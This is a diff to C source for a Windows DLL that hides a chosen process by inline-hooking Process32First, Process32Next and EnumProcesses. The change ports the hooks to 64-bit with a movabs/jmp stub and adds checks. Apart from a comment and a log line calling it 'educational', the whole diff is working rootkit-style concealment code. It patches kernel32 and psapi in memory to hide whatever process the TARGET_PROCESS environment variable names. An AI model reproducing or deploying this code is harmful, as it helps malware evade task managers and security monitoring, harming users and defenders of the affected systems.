@@ -3,6 +3,7 @@
  * 
  * This code demonstrates how process hiding works by hooking
  * Windows API functions related to process enumeration.
+ * Updated for 64-bit compatibility.
  */
 
 #include <windows.h>
@@ -16,7 +17,7 @@ char TARGET_PROCESS[MAX_PATH] = {0};
 // Function pointer types for the functions we'll hook
 typedef BOOL (WINAPI *PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
 typedef BOOL (WINAPI *PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
-typedef DWORD (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);
+typedef BOOL (WINAPI *ENUMPROCESSES)(DWORD*, DWORD, LPDWORD);
 
 // Original function pointers
 PROCESS32NEXT OriginalProcess32Next = NULL;
@@ -50,7 +51,7 @@ BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
     result = OriginalProcess32Next(hSnapshot, lppe);
     
     // If successful and the process matches our target, skip it
-    if (result && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
+    if (result && TARGET_PROCESS[0] != '\0' && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
         // Call original again to get the next process instead
         return OriginalProcess32Next(hSnapshot, lppe);
     }
@@ -66,7 +67,7 @@ BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
     result = OriginalProcess32First(hSnapshot, lppe);
     
     // If successful and the process matches our target, skip it
-    if (result && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
+    if (result && TARGET_PROCESS[0] != '\0' && _stricmp(lppe->szExeFile, TARGET_PROCESS) == 0) {
         // Call original Process32Next to get the next process instead
         return OriginalProcess32Next(hSnapshot, lppe);
     }
@@ -79,7 +80,7 @@ BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesRetu
     // Call original function
     BOOL result = OriginalEnumProcesses(pProcessIds, cb, pBytesReturned);
     
-    if (result) {
+    if (result && TARGET_PROCESS[0] != '\0') {
         DWORD targetPid = GetProcessIdByName(TARGET_PROCESS);
         if (targetPid == 0) return result; // Target not found
         
@@ -100,10 +101,12 @@ BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, LPDWORD pBytesRetu
     return result;
 }
 
-// Set up function hooks
+// Set up function hooks with proper 64-bit pointer arithmetic
 BOOL SetupHooks() {
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     HMODULE hPsapi = GetModuleHandleA("psapi.dll");
+    DWORD oldProtect;
+    BOOL success = TRUE;
     
     if (!hKernel32 || !hPsapi) {
         return FALSE;
@@ -118,28 +121,70 @@ BOOL SetupHooks() {
         return FALSE;
     }
     
-    // Set up hooks by modifying memory protection and writing jump instructions
-    DWORD oldProtect;
-    
+#ifdef _WIN64
+    // 64-bit hook implementation
+    BYTE jumpCode[] = {
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, addr
+        0xFF, 0xE0                                                  // jmp rax
+    };
+
     // Hook Process32Next
-    VirtualProtect(OriginalProcess32Next, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
-    *(BYTE*)OriginalProcess32Next = 0xE9; // JMP instruction
-    *(DWORD*)((BYTE*)OriginalProcess32Next + 1) = (DWORD)HookedProcess32Next - (DWORD)OriginalProcess32Next - 5;
-    VirtualProtect(OriginalProcess32Next, 5, oldProtect, &oldProtect);
+    if (VirtualProtect(OriginalProcess32Next, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(UINT64*)&jumpCode[2] = (UINT64)HookedProcess32Next;
+        memcpy(OriginalProcess32Next, jumpCode, sizeof(jumpCode));
+        VirtualProtect(OriginalProcess32Next, sizeof(jumpCode), oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
     
     // Hook Process32First
-    VirtualProtect(OriginalProcess32First, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
-    *(BYTE*)OriginalProcess32First = 0xE9; // JMP instruction
-    *(DWORD*)((BYTE*)OriginalProcess32First + 1) = (DWORD)HookedProcess32First - (DWORD)OriginalProcess32First - 5;
-    VirtualProtect(OriginalProcess32First, 5, oldProtect, &oldProtect);
+    if (VirtualProtect(OriginalProcess32First, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(UINT64*)&jumpCode[2] = (UINT64)HookedProcess32First;
+        memcpy(OriginalProcess32First, jumpCode, sizeof(jumpCode));
+        VirtualProtect(OriginalProcess32First, sizeof(jumpCode), oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
     
     // Hook EnumProcesses
-    VirtualProtect(OriginalEnumProcesses, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
-    *(BYTE*)OriginalEnumProcesses = 0xE9; // JMP instruction
-    *(DWORD*)((BYTE*)OriginalEnumProcesses + 1) = (DWORD)HookedEnumProcesses - (DWORD)OriginalEnumProcesses - 5;
-    VirtualProtect(OriginalEnumProcesses, 5, oldProtect, &oldProtect);
+    if (VirtualProtect(OriginalEnumProcesses, sizeof(jumpCode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(UINT64*)&jumpCode[2] = (UINT64)HookedEnumProcesses;
+        memcpy(OriginalEnumProcesses, jumpCode, sizeof(jumpCode));
+        VirtualProtect(OriginalEnumProcesses, sizeof(jumpCode), oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
+#else
+    // 32-bit hook implementation (kept for reference)
+    // Hook Process32Next
+    if (VirtualProtect(OriginalProcess32Next, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(BYTE*)OriginalProcess32Next = 0xE9; // JMP instruction
+        *(DWORD*)((BYTE*)OriginalProcess32Next + 1) = (DWORD)((DWORD_PTR)HookedProcess32Next - (DWORD_PTR)OriginalProcess32Next - 5);
+        VirtualProtect(OriginalProcess32Next, 5, oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
     
-    return TRUE;
+    // Hook Process32First
+    if (VirtualProtect(OriginalProcess32First, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(BYTE*)OriginalProcess32First = 0xE9; // JMP instruction
+        *(DWORD*)((BYTE*)OriginalProcess32First + 1) = (DWORD)((DWORD_PTR)HookedProcess32First - (DWORD_PTR)OriginalProcess32First - 5);
+        VirtualProtect(OriginalProcess32First, 5, oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
+    
+    // Hook EnumProcesses
+    if (VirtualProtect(OriginalEnumProcesses, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        *(BYTE*)OriginalEnumProcesses = 0xE9; // JMP instruction
+        *(DWORD*)((BYTE*)OriginalEnumProcesses + 1) = (DWORD)((DWORD_PTR)HookedEnumProcesses - (DWORD_PTR)OriginalEnumProcesses - 5);
+        VirtualProtect(OriginalEnumProcesses, 5, oldProtect, &oldProtect);
+    } else {
+        success = FALSE;
+    }
+#endif
+    
+    return success;
 }
 
 // DLL entry point
@@ -147,15 +192,15 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     switch (fdwReason) {
         case DLL_PROCESS_ATTACH:
             // Read target process from environment variable
-            if (GetEnvironmentVariableA("HIDE_PROCESS", TARGET_PROCESS, MAX_PATH)) {
-                SetupHooks();
-                
-                // Create a hidden log file for educational purposes
-                FILE* logFile = fopen("C:\\process_hider_log.txt", "w");
-                if (logFile) {
-                    fprintf(logFile, "Process hiding active for: %s\n", TARGET_PROCESS);
-                    fprintf(logFile, "Educational purposes only!\n");
-                    fclose(logFile);
+            if (GetEnvironmentVariableA("TARGET_PROCESS", TARGET_PROCESS, MAX_PATH)) {
+                if (SetupHooks()) {
+                    // Create a hidden log file for educational purposes
+                    FILE* logFile;
+                    if (fopen_s(&logFile, "C:\\process_hider_log.txt", "w") == 0 && logFile) {
+                        fprintf(logFile, "Process hiding active for: %s\n", TARGET_PROCESS);
+                        fprintf(logFile, "Educational purposes only!\n");
+                        fclose(logFile);
+                    }
                 }
             }
             break;
